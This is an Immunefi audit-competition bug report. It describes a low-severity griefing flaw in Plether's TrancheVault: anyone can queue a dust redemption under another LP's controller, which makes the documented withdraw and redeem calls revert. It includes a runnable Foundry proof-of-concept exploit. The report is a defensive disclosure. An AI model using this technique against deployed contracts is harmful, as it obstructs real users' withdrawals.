# \#99780 [SC-Low] Dust redemption request blocks another LP's `withdraw` and `redeem` claims

**Submitted on Nov 15th 2026 at 08:18:11 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99780
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief / Intro

`TrancheVault.requestRedeem(shares, controller, owner)` checks that the caller may spend the owner's shares, but it never checks that the named controller agreed to receive the request. An attacker can therefore spend a near-worthless share balance of its own on a redemption request whose controller is another LP. The request's USDG quote rounds to zero, so settlement makes its shares refundable, yet it stays at the head of the victim's controller queue. The ERC-4626 `withdraw` and `redeem` calls, which Plether's canonical LP instructions name as the way to claim a funded exit, take no request ID and read only that head, so they revert even after the victim's own later redemption is fully funded. In the PoC, which uses release parameters, public vault functions and permissionless epoch settlement with only Pyth and USDG mocked, an attacker who spent 1 USDG on shares places a 999-share-atom request in front of a victim whose **99,999.99 USDG** redemption is fully funded: `maxWithdraw` and `maxRedeem` report 0, and every `withdraw` and `redeem` attempt reverts. The victim's USDG stays claimable through the ID-based `claimRedeem`, so no value is lost, but the documented claim path does not work.

## Vulnerability Details

Plether's canonical LP instructions (CANONICAL_ENTRYPOINTS.md L191-L192) tell holders to exit by calling `requestRedeem(shares, controller, owner)` and to claim a funded redemption "through ERC-4626 `redeem` or `withdraw`". Neither call accepts a request ID. Both claim from whatever request sits at the head of the controller's queue:

```solidity
// TrancheVault.sol L1006-L1020
function withdraw(
    uint256 assets,
    address receiver,
    address controller
) public override returns (uint256 shares) {
    return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
}

function redeem(
    uint256 shares,
    address receiver,
    address controller
) public override returns (uint256 assets) {
    return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}
```

The head of a controller's queue can be set by anyone. `requestRedeem` checks the cooldown, the maximum and minimum redemption size and the caller's authority over the owner's shares, and then enqueues the request under whatever controller the caller names. There is no check that the controller consented:

```solidity
// TrancheVault.sol L624-L631 (requestRedeem)
_requireMinimumRedeemSize(shares, maxShares);
if (msg.sender != owner && !isOperator[owner][msg.sender]) {
    _spendAllowance(owner, msg.sender, shares);
}
_transfer(owner, address(this), shares);

requestId = _enqueueRedeemRequest(shares, controller);
emit RedeemRequest(controller, owner, requestId, msg.sender, shares);
```

`_enqueueRedeemRequest` (L688-L708) then appends the epoch to `redeemRequests[controller]` and to the controller's queue. An attacker calls `requestRedeem` with `owner` set to an account it controls and `controller` set to the victim. It needs neither the victim's approval nor the victim's shares.

The attacker's request can be dust. `_requireMinimumRedeemSize` (L1611-L1618) rejects a small request only when it is not the owner's whole balance, so an account holding 999 share atoms, worth less than one USDG atom, can redeem all of them. In an otherwise empty epoch the request's USDG quote rounds to zero, and `HousePool._fundRedemptionPhase` (L944-L987) refunds the remaining shares and advances the global epoch queue. The victim's own controller queue is not advanced: the refundable dust request stays at its head until the victim clears it.

When the victim later requests a real redemption, it lands in a later epoch, behind the dust. The pool funds it in full, but `maxWithdraw` and `maxRedeem` (L1299-L1311) look only at the head, so both return 0, and `withdraw` or `redeem` for the funded amount revert. A failed call neither removes the dust nor moves on to the victim's request, so every retry fails the same way. Requests from the same epoch merge into one position, but an attacker can place a separate dust head in each epoch, including while earlier ones are still there, and each head blocks the no-ID calls until the victim clears it.

The victim has two ways out, and neither is the documented flow. It can find its request ID from an event or from the public controller queue and call `claimRedeem(requestId, ...)`, which pays in full. Or it can call `claimRedeemRefund(dustId, ...)` once per dust head, which hands it the attacker's dust shares and restarts its one-hour cooldown on new redemption requests, after which `withdraw` works again for the funded request.

## Impact Details

Plether documents `withdraw` and `redeem` as the way for an LP to claim a funded redemption, and the contract does not deliver that for a victim of this attack. An unprivileged attacker, at a cost of about 1 USDG of shares and one transaction per epoch, can make an LP's funded exit invisible to `maxWithdraw` and `maxRedeem` and make the documented claim calls revert on every attempt. A client or frontend that relies on the standard ERC-4626 surface shows nothing to claim, and an LP who sends the transaction anyway pays gas for each failed attempt. The LP's USDG is not lost or frozen, because `claimRedeem` with the request ID still pays it in full, but reaching it requires recovering the request ID and calling a non-standard function, or spending one extra transaction per dust head on `claimRedeemRefund`, which also restarts the LP's cooldown on new redemption requests.

## Recommendation

Do not let a third party place a request in another account's controller queue without consent: require `msg.sender` to be the controller or an operator the controller has approved, as ERC-7540 allows, or skip a refundable or zero-asset head in `withdraw`, `redeem`, `maxWithdraw` and `maxRedeem` so that the no-ID calls reach the first request that can actually pay.

## References

The canonical LP instructions name `redeem` and `withdraw` as the claim path: [CANONICAL_ENTRYPOINTS.md#L189-L192](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L189-L192)

`requestRedeem` accepts any controller without consent: [TrancheVault.sol#L606-L632](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol?plain=1#L606-L632)

The request is appended to the named controller's queue: [TrancheVault.sol#L688-L708](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol?plain=1#L688-L708)

`withdraw` and `redeem` claim only from the controller's queue head: [TrancheVault.sol#L1006-L1020](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol?plain=1#L1006-L1020)

`maxWithdraw` and `maxRedeem` read only the head: [TrancheVault.sol#L1299-L1311](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol?plain=1#L1299-L1311)

A zero-quote epoch is refunded without advancing the controller queue: [HousePool.sol#L944-L987](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L944-L987)

## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts. Every LP action goes through the public `TrancheVault` functions (`requestDeposit`, `claimDeposit`, `requestRedeem`, `withdraw`, `redeem`, `claimRedeem`, `claimRedeemRefund`), and every LP epoch is settled through the permissionless `router.settleLpEpoch` with a Pyth tick, called from an arbitrary address. No protocol contract is impersonated. The test applies the release parameters from `DEPLOYMENT.md`, including the 1 USDG tranche seeds and the Senior cap of 40M/80%.

### Step-by-step (`test_DocumentedClaimsKeepRevertingButIdClaimPaysInFull`)

**Setup.** The victim deposits 100,000 USDG and the attacker deposits 1 USDG into the Junior tranche through the public deposit flow, and the deposit cooldown passes.

**Dust head.** The attacker transfers 999 share atoms to a fresh account it controls. That account calls `requestRedeem(999, victim, dustAccount)`, which passes the minimum-size check because it is the account's whole balance. The epoch is settled by a third party, the quote rounds to zero and the epoch is marked refundable, but the request remains the head of the victim's controller queue.

**Funded redemption.** The victim requests a redemption of its whole balance in a later epoch, and settlement funds it in full: 99,999.999964 USDG are claimable for the request.

**Blocked claim.** `maxWithdraw(victim)` and `maxRedeem(victim)` both return 0. Two `withdraw` calls for the funded amount and one `redeem` call for the funded shares all revert, and the dust request is still the head afterwards.

**Recovery by ID.** `claimRedeem(requestId, shares, victim, victim)` pays the full 99,999.999964 USDG, which shows that the funds were never lost.

### Other scenarios covered by the test

`test_ClearingDustRestoresWithdrawButStartsNewRequestCooldown` has the victim clear the dust head with `claimRedeemRefund`. The victim receives the attacker's 999 share atoms, its funded request becomes the head, and `withdraw` then pays the full amount at once. The refund sets the victim's `lastDepositTime` to the current block, so `maxRequestRedeem` returns 0 for one hour and new redemption requests are blocked until the cooldown ends.

`test_ThreeSeparateDustHeadsStillBlockNoIdClaims` places dust heads in three separate epochs from three fresh accounts before the victim's funded redemption. `withdraw` keeps reverting after the first and second heads are cleared, and works only after the victim has spent three extra transactions on `claimRedeemRefund`.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/ControllerQueueGriefPoC.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/ControllerQueueGriefPoC.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `Suite result: ok. 3 passed; 0 failed; 0 skipped`, with the values above in the logs.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title A third-party dust redemption blocks another LP's documented withdrawal path
/// @notice `TrancheVault.requestRedeem(shares, controller, owner)` lets any share owner name any controller. An
///         attacker spends its whole 999-share-atom balance (allowed by the full-balance exception to the minimum
///         redemption size) on a request whose controller is the victim. The request's USDG quote rounds to zero, so
///         settlement makes it refundable, but it stays at the head of the victim's controller queue. The no-ID
///         ERC-4626 claim calls `withdraw` and `redeem`, which the canonical LP instructions document, read only that
///         head: they revert even after the victim's own later redemption is fully funded.
/// @dev Release parameters from packages/perps/DEPLOYMENT.md. Every LP action uses the public vault functions and
///      every epoch is settled through the permissionless `router.settleLpEpoch` with a Pyth tick. Pyth and USDG are
///      the only mocks. No contract under src/ is modified or impersonated.
contract ControllerQueueGriefPoC is BasePerpTest {

    address internal constant VICTIM = address(0xA11CE); // honest Junior LP
    address internal constant ATTACKER = address(0xE7E); // attacker's funded account
    address internal constant KEEPER = address(0xBEEF); // anyone

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant DUST_SHARES = 999; // worth less than 1 USDG atom (1 USDG atom = 1,000 share atoms)

    // ------------------------------------------------------------------------------------------------------------
    // Release configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        // The admin timelocks above end inside a weekend closure; resume on the next Monday 10:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        vm.roll(vm.getBlockNumber() + 10);

        _publicJuniorDeposit(VICTIM, 100_000e6);
        _publicJuniorDeposit(ATTACKER, 1e6); // 1 USDG buys the attacker all the dust it needs
        _goto(vm.getBlockTimestamp() + 1 hours + 1); // past the deposit cooldown
    }

    // ------------------------------------------------------------------------------------------------------------
    // Helpers (public entry points only)
    // ------------------------------------------------------------------------------------------------------------

    function _goto(
        uint256 timestamp
    ) internal {
        if (timestamp > vm.getBlockTimestamp()) {
            vm.warp(timestamp);
        }
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _tick() internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 publishTime = vm.getBlockTimestamp();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(SafeCast.toInt64(SafeCast.toInt256(PRICE)), 0, -8, publishTime, publishTime - 1)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    /// @dev Moves to the epoch's start and settles it through the permissionless router entry point.
    function _settleEpoch(
        uint256 epochId
    ) internal {
        _goto(pool.lpEpochStart(epochId));
        vm.prank(KEEPER);
        router.settleLpEpoch(_tick());
    }

    function _publicJuniorDeposit(
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _settleEpoch(requestId);
        assertEq(juniorVault.claimableDepositRequest(requestId, lp), amount, "deposit activated in full");
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, amount, lp, lp);
    }

    /// @dev The attacker moves 999 share atoms to a fresh account it controls, which then redeems its whole balance
    ///      with the victim as controller. Only the attacker's own shares are used; the victim approves nothing.
    function _injectDustHead(
        address dustHolder
    ) internal returns (uint256 dustId) {
        vm.prank(ATTACKER);
        juniorVault.transfer(dustHolder, DUST_SHARES);
        vm.prank(dustHolder);
        dustId = juniorVault.requestRedeem(DUST_SHARES, VICTIM, dustHolder);
        _settleEpoch(dustId); // nothing else in the epoch: the quote rounds to zero and the shares become refundable
        (,,,,,,,,, bool refundEnabled) = juniorVault.redeemEpochs(dustId);
        assertTrue(refundEnabled, "dust epoch is refundable");
    }

    /// @dev The victim redeems its whole balance in a later epoch, which the pool funds in full.
    function _victimFundedRedemption() internal returns (uint256 requestId, uint256 shares, uint256 assets) {
        shares = juniorVault.balanceOf(VICTIM);
        vm.prank(VICTIM);
        requestId = juniorVault.requestRedeem(shares, VICTIM, VICTIM);
        _settleEpoch(requestId);
        assertEq(juniorVault.claimableRedeemRequest(requestId, VICTIM), shares, "victim redemption fully funded");
        assets = juniorVault.claimableRedeemAssets(requestId, VICTIM);
        assertGt(assets, 99_000e6, "funded with the victim's USDG");
    }

    function _tryWithdraw(
        uint256 assets
    ) internal returns (bool ok) {
        vm.prank(VICTIM);
        (ok,) = address(juniorVault).call(abi.encodeCall(juniorVault.withdraw, (assets, VICTIM, VICTIM)));
    }

    function _tryRedeem(
        uint256 shares
    ) internal returns (bool ok) {
        vm.prank(VICTIM);
        (ok,) = address(juniorVault).call(abi.encodeCall(juniorVault.redeem, (shares, VICTIM, VICTIM)));
    }

    // ------------------------------------------------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------------------------------------------------

    /// @notice The documented `withdraw` / `redeem` calls revert repeatedly for a fully funded redemption, while the
    ///         ID-based `claimRedeem` still pays it in full.
    function test_DocumentedClaimsKeepRevertingButIdClaimPaysInFull() public {
        uint256 dustId = _injectDustHead(address(0xD057));
        assertEq(juniorVault.controllerRedeemHead(VICTIM), dustId, "attacker's dust is the victim's queue head");

        (uint256 requestId, uint256 shares, uint256 assets) = _victimFundedRedemption();
        assertGt(requestId, dustId, "victim request is behind the dust");
        console2.log("victim funded shares", shares);
        console2.log("victim funded USDG (6 dec)", assets);
        console2.log("maxWithdraw(victim)", juniorVault.maxWithdraw(VICTIM));
        console2.log("maxRedeem(victim)", juniorVault.maxRedeem(VICTIM));
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "maxWithdraw hides the funded claim");
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "maxRedeem hides the funded claim");

        assertFalse(_tryWithdraw(assets), "withdraw reverts");
        assertFalse(_tryWithdraw(assets), "withdraw still reverts on retry");
        assertFalse(_tryRedeem(shares), "redeem reverts");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), dustId, "failed calls leave the dust at the head");

        uint256 before = settlementToken.balanceOf(VICTIM);
        vm.prank(VICTIM);
        uint256 paid = juniorVault.claimRedeem(requestId, shares, VICTIM, VICTIM);
        assertEq(paid, assets, "claim by ID pays in full");
        assertEq(settlementToken.balanceOf(VICTIM) - before, assets, "USDG received");
    }

    /// @notice Clearing the dust with `claimRedeemRefund` restores `withdraw` for the funded request at once, but the
    ///         refunded shares restart the victim's one-hour cooldown on new redemption requests.
    function test_ClearingDustRestoresWithdrawButStartsNewRequestCooldown() public {
        uint256 dustId = _injectDustHead(address(0xD057));
        (uint256 requestId,, uint256 assets) = _victimFundedRedemption();
        assertFalse(_tryWithdraw(assets), "blocked before clearing");

        vm.prank(VICTIM);
        uint256 refunded = juniorVault.claimRedeemRefund(dustId, VICTIM, VICTIM);
        assertEq(refunded, DUST_SHARES, "victim receives the attacker's dust shares");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), requestId, "the funded request is now the head");
        assertEq(juniorVault.maxWithdraw(VICTIM), assets, "maxWithdraw shows the funded amount");

        uint256 before = settlementToken.balanceOf(VICTIM);
        assertTrue(_tryWithdraw(assets), "withdraw works after clearing");
        assertEq(settlementToken.balanceOf(VICTIM) - before, assets, "paid in full, no delay on funded USDG");

        assertEq(juniorVault.lastDepositTime(VICTIM), vm.getBlockTimestamp(), "refund restarts the cooldown");
        assertEq(juniorVault.maxRequestRedeem(VICTIM), 0, "new redemption requests blocked for one hour");
        _goto(vm.getBlockTimestamp() + 1 hours);
        assertGt(juniorVault.maxRequestRedeem(VICTIM), 0, "new requests allowed again after the cooldown");
    }

    /// @notice Dust heads placed in three separate epochs each block the no-ID calls until the victim clears them,
    ///         one extra transaction per head.
    function test_ThreeSeparateDustHeadsStillBlockNoIdClaims() public {
        uint256[3] memory dustIds;
        dustIds[0] = _injectDustHead(address(0xD051));
        dustIds[1] = _injectDustHead(address(0xD052));
        dustIds[2] = _injectDustHead(address(0xD053));
        assertLt(dustIds[0], dustIds[1], "separate epochs");
        assertLt(dustIds[1], dustIds[2], "separate epochs");

        (uint256 requestId,, uint256 assets) = _victimFundedRedemption();
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "blocked by three heads");

        for (uint256 i; i < 3; ++i) {
            assertEq(juniorVault.controllerRedeemHead(VICTIM), dustIds[i], "next dust head");
            assertFalse(_tryWithdraw(assets), "withdraw reverts while any dust head remains");
            vm.prank(VICTIM);
            juniorVault.claimRedeemRefund(dustIds[i], VICTIM, VICTIM);
            console2.log("dust heads cleared", i + 1);
        }
        assertEq(juniorVault.controllerRedeemHead(VICTIM), requestId, "funded request reached the head");
        assertTrue(_tryWithdraw(assets), "withdraw works only after three extra transactions");
    }

}
```

